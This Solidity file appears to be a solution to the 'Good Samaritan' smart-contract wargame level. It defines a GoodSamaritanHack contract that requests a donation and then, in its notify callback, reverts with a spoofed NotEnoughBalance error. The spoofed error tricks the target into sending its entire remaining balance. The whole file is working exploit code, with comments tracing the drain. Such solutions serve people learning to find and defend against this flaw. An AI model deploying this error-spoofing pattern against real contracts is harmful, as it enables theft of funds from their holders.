// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./GoodSamaritan.sol";
import "forge-std/console.sol";

contract GoodSamaritanHack is INotifyable {
    error NotEnoughBalance();

    function attack(address _addr) public {
        GoodSamaritan(_addr).requestDonation();
    }

    function notify(uint256 amount) external view {
        console.log(amount);
        // first: 10  donate10
        // next :1000000 transferRemainder
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
